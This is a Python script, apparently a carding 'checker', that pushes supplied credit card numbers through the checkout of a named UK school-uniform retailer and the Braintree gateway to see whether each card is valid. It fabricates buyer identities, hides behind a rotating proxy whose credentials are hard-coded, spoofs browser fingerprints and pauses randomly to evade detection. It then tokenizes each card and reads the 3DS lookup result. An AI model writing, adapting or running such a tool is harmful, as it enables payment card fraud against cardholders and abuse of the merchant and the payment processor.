import random, time, base64, uuid, re, json, os, requests
from faker import Faker
from urllib.parse import quote, unquote
from curl_cffi import requests
from fake_useragent import UserAgent

fake = Faker('en_GB')

PRX = "http://bxgjlizg-rotate:mjzr41kvin2m@p.webshare.io:80"

def capture(data, start, end):
    try:
        star = data.index(start) + len(start); last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def process_card(cc_input):
    try:
        cc, mes, ano, cvv = cc_input.strip().split('|')
        if len(ano) == 2: ano = "20" + ano
        if len(mes) == 1: mes = "0" + mes
    except ValueError:
        return "RECHAZADO: Formato incorrecto. Use: cc|mm|yyyy|cvv"

    session = requests.Session(impersonate=random.choice(["chrome124", "chrome123", "safari17_0"]))
    session.proxies = {"http": PRX, "https": PRX}
    session.headers.update({'User-Agent': UserAgent().random})

    # [1] Visita Inicial
    try:
        r = session.get('https://topclassschoolwear.co.uk/school-uniforms-uk/huddersfield-primary-school-uniform/st-aidan-s-academy/school-uniform-sweater-jumper', timeout=20)
        form_key = capture(r.text, 'name="form_key" type="hidden" value="', '"')
        uenc = capture(r.text, '/add/uenc/', '/product/')
        if not form_key:
            return "RECHAZADO: form_key no encontrado"

        session.cookies.set('form_key', form_key, domain='topclassschoolwear.co.uk')
    except Exception as e:
        return f"RECHAZADO: Error en Visita Inicial (P1) - {e}"

    time.sleep(random.uniform(1.5, 3))

    # [2] Agregar al carrito
    try:
        add_url = f'https://topclassschoolwear.co.uk/checkout/cart/add/uenc/{uenc}/product/6/'
        data = {'product': '6', 'item': '6', 'form_key': form_key, 'options[11]': '34', 'qty': '1'}
        r = session.post(add_url, data=data, timeout=20, headers={'X-Requested-With': 'XMLHttpRequest'})
        if r.status_code != 200:
            return "RECHAZADO: Error al agregar al carrito"
    except Exception as e: return f"RECHAZADO: Error al agregar al carrito (P2) - {e}"

    time.sleep(random.uniform(2, 4))

    # [3] Checkout & ID
    cart_id, total_price, merchant_id, bt_auth = None, "15.45", "pwmg6ky8gnj4y68t", None
    try:
        session.get('https://topclassschoolwear.co.uk/checkout/cart/', timeout=20)
        r = session.get('https://topclassschoolwear.co.uk/checkout/', timeout=25)
        html = r.text

        cart_id = capture(html, '"entity_id":"', '"') or capture(html, '\\"entity_id\\":\\"', '\\"') or \
                  capture(html, '"masked_id":"', '"') or capture(html, '"cartId":"', '"')
        
        price_raw = capture(html, '"grand_total":', ',') or capture(html, '"value":', '}') or "15.45"
        total_price = re.sub(r'[^\d.]', '', str(price_raw)).strip()
        
        if not cart_id:
            r_sec = session.get('https://topclassschoolwear.co.uk/customer/section/load/?sections=cart', headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=15)
            cart_id = r_sec.json().get('cart', {}).get('masked_id') or r_sec.json().get('cart', {}).get('entity_id')

        tk_raw = capture(html, '"clientToken":"', '"') or capture(html, 'paymentToken\\":\\"', '\\"')
        
        if tk_raw:
            try:
                dec = json.loads(base64.b64decode(unquote(tk_raw)).decode('utf-8'))
                bt_auth = dec.get('authorizationFingerprint')
                merchant_id = dec.get('merchantId') or merchant_id
                if bt_auth:
                    pay_part = bt_auth.split('.')[1]
                    p_dec = json.loads(base64.b64decode(pay_part + '=' * (-len(pay_part) % 4)).decode('utf-8'))
                    merchant_id = p_dec.get('merchant', {}).get('public_id') or p_dec.get('merchantId') or merchant_id
            except:
                bt_auth = tk_raw
        
    except Exception as e:
        return f"RECHAZADO: Error en Checkout (P3) - {e}"

    time.sleep(random.uniform(2, 4))

    # [4] Shipping & Info
    try:
        fn, ln = fake.first_name(), fake.last_name()
        em, ad, pc, ct = f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com", fake.street_address(), fake.postcode(), fake.city()
        ph = f"07{random.randint(100000000, 999999999)}"
        
        ship_data = {
            'addressInformation': {
                'shipping_address': {'countryId': 'GB', 'street': [ad], 'telephone': ph, 'postcode': pc, 'city': ct, 'firstname': fn, 'lastname': ln},
                'billing_address': {'countryId': 'GB', 'street': [ad], 'telephone': ph, 'postcode': pc, 'city': ct, 'firstname': fn, 'lastname': ln},
                'shipping_method_code': 'matrixrate_33',
                'shipping_carrier_code': 'matrixrate',
            },
        }
        session.post(f'https://topclassschoolwear.co.uk/rest/ssv/V1/guest-carts/{cart_id}/shipping-information', json=ship_data, timeout=20)
        session.post(f'https://topclassschoolwear.co.uk/rest/ssv/V1/guest-carts/{cart_id}/set-payment-information', json={'cartId': cart_id, 'paymentMethod': {'method': 'braintree'}, 'email': em}, timeout=20)
    except Exception as e:
        return f"RECHAZADO: Error en envío de datos (P4/5) - {e}"

    time.sleep(random.uniform(2, 4))

    # [6] Tokenize
    payment_token, bt_session_id = None, str(uuid.uuid4())
    try:
        h = {
            'Authorization': f'Bearer {bt_auth}', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com', 'Referer': 'https://assets.braintreegateway.com/'
        }
        qry = 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }'
        bt_payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': bt_session_id},
            'query': qry,
            'variables': {
                'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv, 'cardholderName': f"{fn} {ln}"}, 'options': {'validate': False}},
            },
            'operationName': 'TokenizeCreditCard',
        }
        r = session.post('https://payments.braintree-api.com/graphql', headers=h, json=bt_payload, timeout=20)
        res = r.json(); data = res.get('data')
        if data: payment_token = data.get('tokenizeCreditCard', {}).get('token')
        if not payment_token:
            err = res.get('errors', [{}])[0].get('message', 'Error desconocido en tokenización')
            return f"RECHAZADO: {err}"
    except Exception as e: return f"RECHAZADO: Error en tokenización (P6) - {e}"

    time.sleep(random.uniform(2, 4))

    # [7] 3DS Lookup
    try:
        v_h = {
            'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization': f'Bearer {bt_auth}',
            'Origin': 'https://topclassschoolwear.co.uk', 'Referer': 'https://topclassschoolwear.co.uk/', 'Braintree-Version': '2018-05-10'
        }
        info = {'billingGivenName': fn, 'billingSurname': ln, 'billingLine1': ad, 'billingCity': ct, 'billingPostalCode': pc, 'billingCountryCode': 'GB', 'billingPhoneNumber': ph, 'email': em}
        v_p = {
            'amount': total_price, 'additionalInfo': info, 'bin': cc[:6], 'dfReferenceId': f"0_{bt_session_id}",
            'browserColorDepth': 24, 'browserJavaEnabled': False, 'browserJavascriptEnabled': True,
            'browserLanguage': 'en-GB', 'browserScreenHeight': 1080, 'browserScreenWidth': 1920,
            'browserTimeZone': 0, 'deviceChannel': 'Browser',
            'clientMetadata': {'requestedThreeDSecureVersion': '2', 'sdkVersion': 'web/3.67.0', 'cardinalDeviceDataCollectionTimeElapsed': random.randint(150, 450)},
            'authorizationFingerprint': bt_auth, 'braintreeLibraryVersion': 'braintree/web/3.67.0',
            '_meta': {
                'merchantAppId': 'topclassschoolwear.co.uk', 'platform': 'web', 'sdkVersion': '3.67.0',
                'source': 'client', 'integration': 'custom', 'integrationType': 'custom', 'sessionId': bt_session_id,
            },
        }
        u = f'https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{payment_token}/three_d_secure/lookup'
        r = session.post(u, headers=v_h, json=v_p, timeout=25)
        res = r.json(); pm = res.get('paymentMethod')
        if not pm:
            err = res.get('errors') or res.get('message') or f"Status Code: {r.status_code}"
            return f"RECHAZADO: Fallo en 3DS Lookup - {err}"

        tds = pm.get('threeDSecureInfo', {})
        status, enrolled = tds.get('status'), tds.get('enrolled')
        return f"3DS Status: {status}" # Devuelve un mensaje claro y estandarizado
    except Exception as e: return f"RECHAZADO: Error en 3DS Lookup (P7) - {e}"

if __name__ == "__main__":
    print("Este script está diseñado para ser importado como un módulo y no para ejecución directa.")
